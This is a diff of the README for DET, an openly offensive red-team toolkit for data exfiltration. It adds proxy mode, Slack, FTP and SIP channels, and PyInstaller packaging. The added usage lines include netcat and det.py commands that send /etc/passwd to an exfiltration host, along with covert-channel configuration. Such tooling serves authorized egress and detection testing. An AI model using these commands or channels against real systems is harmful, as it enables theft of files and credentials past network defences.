@@ -1,3 +1,5 @@
+[![Black Hat Arsenal](https://www.toolswatch.org/badges/arsenal/2016.svg)](https://www.blackhat.com/us-16/arsenal.html#det)
+
 DET (extensible) Data Exfiltration Toolkit
 =======
 
@@ -53,51 +55,58 @@ pip install -r requirements.txt --user
 # Configuration
 
 In order to use DET, you will need to configure it and add your proper settings (eg. SMTP/IMAP, AES256 encryption
-passphrase and so on). A configuration example file has been provided and is called: ```config-sample.json```
+passphrase, proxies and so on). A configuration example file has been provided and is called: ```config-sample.json```
 
 ```json
 {
     "plugins": {
         "http": {
-            "target": "192.168.1.101",
-            "port": 8080
+            "target": "192.168.0.12",
+            "port": 8080,
+            "proxies": ["192.168.0.13", "192.168.0.14"]
         },
         "google_docs": {
-            "target": "192.168.1.101",
-            "port": 8080,
-        },
+            "target": "conchwaiter.uk.plak.cc",
+            "port": 8080 
+        },        
         "dns": {
             "key": "google.com",
-            "target": "192.168.1.101",
-            "port": 53
+            "target": "192.168.0.12",
+            "port": 53,
+            "proxies": ["192.168.0.13", "192.168.0.14"]
         },
-        "gmail": {
-            "username": "dataexfil@gmail.com",
-            "password": "ReallyStrongPassword",
-            "server": "smtp.gmail.com",
-            "port": 587
-        },
-        "tcp": {
-            "target": "192.168.1.101",
-            "port": 6969
-        },
-        "udp": {
-            "target": "192.168.1.101",
-            "port": 6969
-        },
-        "twitter": {
-            "username": "PaulWebSec",
-            "CONSUMER_TOKEN": "XXXXXXXXX",
-            "CONSUMER_SECRET": "XXXXXXXXX",
-            "ACCESS_TOKEN": "XXXXXXXXX",
-            "ACCESS_TOKEN_SECRET": "XXXXXXXXX"
-        },
+[...SNIP...]
         "icmp": {
-            "target": "192.168.1.101"
+            "target": "192.168.0.12",
+            "proxies": ["192.168.0.13", "192.168.0.14"]
+        },
+        "slack": {
+            "api_token": "xoxb-XXXXXXXXXXX",
+            "chan_id": "XXXXXXXXXXX",
+            "bot_id": "<@XXXXXXXXXXX>:"
+        },
+        "smtp": {
+            "target": "192.168.0.12",
+            "port": 25,
+            "proxies": ["192.168.0.13", "192.168.0.14"]
+        },
+        "ftp": {
+            "target": "192.168.0.12",
+            "port": 21,
+            "proxies": ["192.168.0.13", "192.168.0.14"]
+        },
+        "sip": {
+            "target": "192.168.0.12",
+            "port": 5060,
+            "proxies": ["192.168.0.13", "192.168.0.14"]
         }
     },
     "AES_KEY": "THISISACRAZYKEY",
-    "sleep_time": 10
+    "max_time_sleep": 10,
+    "min_time_sleep": 1,
+    "max_bytes_read": 400,
+    "min_bytes_read": 300,
+    "compression": 1
 }
 ```
 
@@ -108,7 +117,7 @@ passphrase and so on). A configuration example file has been provided and is cal
 ```bash
 python det.py -h
 usage: det.py [-h] [-c CONFIG] [-f FILE] [-d FOLDER] [-p PLUGIN] [-e EXCLUDE]
-              [-L]
+              [-L | -Z]
 
 Data Exfiltration Toolkit (SensePost)
 
@@ -120,6 +129,7 @@ optional arguments:
   -p PLUGIN   Plugins to use (eg. '-p dns,twitter')
   -e EXCLUDE  Plugins to exclude (eg. '-e gmail,icmp')
   -L          Server mode
+  -Z          Proxy mode
 ```
 
 ## Server-side: 
@@ -161,6 +171,18 @@ To load every plugin and exclude DNS:
 ```bash
 python det.py -c ./config.json -e dns -f /etc/passwd
 ```
+You can also listen for files from stdin (e.g output of a netcat listener):
+
+```bash
+nc -lp 1337 | python det.py -c ./config.json -e http -f stdin
+```
+Then send the file to netcat:
+
+```bash
+nc $exfiltration_host 1337 -q 0 < /etc/passwd
+```
+Don't forget netcat's `-q 0` option so that netcat quits once it has finished sending the file.
+
 And in PowerShell (HTTP module): 
 
 ```powershell
@@ -169,6 +191,69 @@ PS C:\Users\user01\Desktop> . .\http_exfil.ps1
 PS C:\Users\user01\Desktop> HTTP-exfil 'C:\path\to\file.exe'
 ```
 
+## Proxy mode:
+
+In this mode the client will proxify the incoming requests towards the final destination.
+The proxies addresses should be set in ```config.json``` file.
+
+```bash
+python det.py -c ./config.json -p dns,icmp -Z
+```
+
+# Standalone package
+
+DET has been adapted in order to run as a standalone executable with the help of [PyInstaller](http://www.pyinstaller.org/).
+
+```bash
+pip install pyinstaller
+```
+
+The spec file ```det.spec``` is provided in order to help you build your executable.
+
+```python
+# -*- mode: python -*-
+
+block_cipher = None
+
+import sys
+sys.modules['FixTk'] = None
+
+a = Analysis(['det.py'],
+             pathex=['.'],
+             binaries=[],
+             datas=[('plugins', 'plugins'), ('config-sample.json', '.')],
+             hiddenimports=['plugins/dns', 'plugins/icmp'],
+             hookspath=[],
+             runtime_hooks=[],
+             excludes=['FixTk', 'tcl', 'tk', '_tkinter', 'tkinter', 'Tkinter'],
+             win_no_prefer_redirects=False,
+             win_private_assemblies=False,
+             cipher=block_cipher)
+pyz = PYZ(a.pure, a.zipped_data,
+             cipher=block_cipher)
+exe = EXE(pyz,
+          a.scripts,
+          a.binaries,
+          a.zipfiles,
+          a.datas,
+          name='det',
+          debug=False,
+          strip=False,
+          upx=True,
+          console=True )
+```
+
+Specify the modules you need to ship with you executable by editing the ```hiddenimports``` array.
+In the example above, PyInstaller will package the DNS and ICMP plugins along with your final executable.
+Finally, launch PyInstaller:
+
+```base
+pyinstaller det.spec
+```
+
+Please note that the number of loaded plugins will reflect on the size of the final executable.
+If you have issues with the generated executable or found a workaround for a tricky situation, please open an issue so this guide can be updated for everyone.
+
 # Modules
 
 So far, DET supports multiple protocols, listed here: 
@@ -176,29 +261,27 @@ So far, DET supports multiple protocols, listed here:
 - [X] HTTP(S)
 - [X] ICMP
 - [X] DNS
-- [X] SMTP/IMAP (eg. Gmail)
-- [X] Raw TCP
+- [X] SMTP/IMAP (Pure SMTP + Gmail)
+- [X] Raw TCP / UDP
+- [X] FTP
+- [X] SIP
 - [X] PowerShell implementation (HTTP, DNS, ICMP, SMTP (used with Gmail))
 
 And other "services": 
 
 - [X] Google Docs (Unauthenticated)
 - [X] Twitter (Direct Messages)
-
-# Experimental modules
-
-So far, I am busy implementing new modules which are almost ready to ship, including: 
-
-- [ ] Skype (95% done)
-- [ ] Tor (80% done)
-- [ ] Github (30/40% done)
+- [X] Slack
 
 # Roadmap
 
 - [X] Add proper encryption (eg. AES-256) Thanks to [ryanohoro](https://github.com/ryanohoro)
 - [X] Compression (extremely important!) Thanks to [chokepoint](https://github.com/chokepoint)
+- [X] Add support for C&C-like multi-host file exfiltration (Proxy mode)
+- [ ] Discovery mode (where distributed agents can learn about the presence of each other)
+- [ ] Egress traffic testing
 - [ ] Proper data obfuscation and integrating [Cloakify Toolset Toolset](https://github.com/trycatchhcf/cloakify)
-- [ ] FTP, FlickR [LSB Steganography](https://github.com/RobinDavid/LSB-Steganography) and Youtube modules
+- [ ] FlickR [LSB Steganography](https://github.com/RobinDavid/LSB-Steganography) and Youtube modules
 
 # References
 
@@ -213,7 +296,7 @@ Some pretty cool references/credits to people I got inspired by with their proje
 
 # Contact/Contributing
 
-You can reach me on Twitter [@PaulWebSec](https://twitter.com/PaulWebSec). 
+You can reach me on Twitter [@PaulWebSec](https://twitter.com/PaulWebSec).
 Feel free if you want to contribute, clone, fork, submit your PR and so on.
 
 # License
